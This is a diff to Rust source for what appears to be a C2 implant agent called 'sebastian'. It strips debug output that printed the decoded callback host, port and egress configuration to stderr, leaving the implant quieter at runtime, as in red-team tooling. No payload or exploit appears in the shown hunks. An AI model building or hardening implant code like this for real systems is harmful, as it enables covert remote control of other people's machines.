@@ -121,8 +121,6 @@ pub fn initialize() {
     });
     FAILED_CONNECTION_THRESHOLD.store(threshold, std::sync::atomic::Ordering::Relaxed);
 
-    eprintln!("[sebastian] Initial egress order: {:?}", order);
-
     // Register C2 profiles from compile-time config env vars
     // Each env var is base64-encoded JSON set by builder.go during payload build
     register_profiles_from_config(&BASE64);
@@ -139,15 +137,14 @@ fn decode_profile_config<T: serde::de::DeserializeOwned>(
     let bytes = match BASE64.decode(b64_config) {
         Ok(b) => b,
         Err(e) => {
-            eprintln!("[sebastian] Failed to base64 decode {} config: {}", profile_name, e);
+            utils::print_debug(&format!("Failed to base64 decode {} config: {}", profile_name, e));
             return None;
         }
     };
-    eprintln!("[sebastian] {} raw config: {}", profile_name, String::from_utf8_lossy(&bytes));
     match serde_json::from_slice(&bytes) {
         Ok(config) => Some(config),
         Err(e) => {
-            eprintln!("[sebastian] Failed to parse {} config: {}", profile_name, e);
+            utils::print_debug(&format!("Failed to parse {} config: {}", profile_name, e));
             None
         }
     }
@@ -157,15 +154,10 @@ fn decode_profile_config<T: serde::de::DeserializeOwned>(
 fn register_profiles_from_config<E: base64::Engine>(_engine: &E) {
     // HTTP profile
     if let Some(config_b64) = option_env!("C2_HTTP_INITIAL_CONFIG") {
-        eprintln!("[sebastian] Found HTTP config, decoding...");
         if let Some(config) = decode_profile_config::<http::HttpInitialConfig>(config_b64, "http") {
-            eprintln!("[sebastian] Registering HTTP profile -> {}:{}", config.callback_host, config.callback_port);
+            utils::print_debug("Registering HTTP profile");
             register_available_c2_profile(Arc::new(http::HttpProfile::new(config)));
-        } else {
-            eprintln!("[sebastian] FAILED to decode HTTP config");
         }
-    } else {
-        eprintln!("[sebastian] No C2_HTTP_INITIAL_CONFIG found at compile time");
     }
 
     // Websocket profile
@@ -227,8 +219,6 @@ pub async fn start() {
         }
     }
     *egress_order = installed_c2.clone();
-    eprintln!("[sebastian] Fixed egress order: {:?}", *egress_order);
-    eprintln!("[sebastian] Registered profiles: {:?}", profiles.keys().collect::<Vec<_>>());
 
     // Start first matching egress profile
     let current_id = CURRENT_CONNECTION_ID.load(std::sync::atomic::Ordering::Relaxed) as usize;
@@ -236,7 +226,6 @@ pub async fn start() {
         if i == current_id {
             if let Some(profile) = profiles.get(egress_c2) {
                 if !profile.is_p2p() {
-                    eprintln!("[sebastian] Starting egress profile: {}", egress_c2);
                     let p = profile.clone();
                     tokio::spawn(async move {
                         p.start().await;
